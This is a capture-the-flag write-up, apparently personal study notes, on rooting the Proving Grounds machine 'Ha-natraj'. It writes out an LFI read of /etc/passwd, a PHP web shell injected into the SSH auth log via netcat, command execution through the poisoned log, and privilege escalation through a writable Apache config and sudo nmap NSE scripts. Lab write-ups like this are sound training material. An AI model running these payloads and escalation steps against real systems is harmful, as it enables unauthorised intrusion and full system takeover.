---
title: "PG Play: Ha-natraj"
created: "2023-09-30"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Play
machine: "Ha-natraj"
os: Linux
status: rooted
tags:
  - proving-grounds
  - pg-play
  - linux
  - ctf
  - oscp
  - lfi
  - log-poisoning
  - ssh-log-poisoning
  - apache-config-abuse
  - sudo-nmap
related:
  - "[[LFI-to-RCE-Log-Poisoning-Pattern]]"
  - "[[Advanced-Linux-PrivEsc-Patterns]]"
  - "[[GTFObins-SUID-Quick-Reference]]"
  - "[[Web-Directory-Enumeration]]"
  - "[[Reverse-Shell-Reference]]"
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Play: Ha-natraj

> **Platform:** Proving Grounds Play | **OS:** Linux | **Date:** 2023-09-30

---

## Quick Summary

**Open Ports:**
- 22/tcp (ssh) — OpenSSH 7.6p1 Ubuntu
- 80/tcp (http) — Apache 2.4.29

**Key Techniques:**
- Directory fuzzing → `/console/file.php` (LFI endpoint)
- LFI via `?file=` parameter
- SSH Log Poisoning (inject PHP into `/var/log/auth.log`)
- Apache2.conf user change + systemctl restart → lateral movement
- sudo nmap → NSE script → root shell

**Privilege Escalation Path:**
- www-data can run `systemctl restart apache2` as root
- `apache2.conf` is world-writable (-rwxrwxrwx)
- Change `User www-data` → `User mahakal` → restart → get shell as mahakal
- mahakal: `sudo /usr/bin/nmap` NOPASSWD → write `.nse` script → `os.execute("/bin/bash")` → root

---

## Full Walkthrough

## Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

## Directory Fuzzing

Found: `/console/` and `/console/file.php`

## LFI + SSH Log Poisoning

**Step 1 — Confirm LFI:**
```sh
curl "http://TARGET/console/file.php?file=../../../../../../../../../../etc/passwd"
```

**Step 2 — Poison SSH auth log:**
```sh
nc -nv TARGET 22
SSH-2.0-OpenSSH_7.6p1 Ubuntu
username/<?php system($_GET['cmd']); ?>
# Protocol mismatch — but PHP is now in /var/log/auth.log
```

**Step 3 — Execute via LFI:**
```sh
curl "http://TARGET/console/file.php?file=../../../../../../var/log/auth.log&cmd=whoami"
# → www-data
```

**Step 4 — Get reverse shell:**
```
?file=../../../../../../var/log/auth.log&cmd=python3+-c+'...'
```

## Privilege Escalation — Two-Step Chain

### Step 1: www-data → mahakal (Apache Config Abuse)

```sh
sudo -l
# → (ALL) NOPASSWD: /bin/systemctl restart apache2

ls -al /etc/apache2/apache2.conf
# → -rwxrwxrwx  ← world-writable!
```

Edit `apache2.conf`: change `User ${APACHE_RUN_USER}` → `User mahakal`

```sh
# Transfer config, edit, transfer back (via netcat)
sudo /bin/systemctl restart apache2
# Trigger LFI reverse shell → runs as mahakal
```

### Step 2: mahakal → root (sudo nmap NSE)

```sh
sudo -l
# mahakal: (root) NOPASSWD: /usr/bin/nmap

echo 'os.execute("/bin/bash")' > /tmp/script.nse
sudo /usr/bin/nmap --script=/tmp/script.nse
# → root shell
```

---

## Technique Links

- [[LFI-to-RCE-Log-Poisoning-Pattern]]
- [[Advanced-Linux-PrivEsc-Patterns]]
- [[GTFObins-SUID-Quick-Reference]]
- [[Web-Directory-Enumeration]]
- [[Reverse-Shell-Reference]]
- [[Proving-Grounds-Master-Index]]
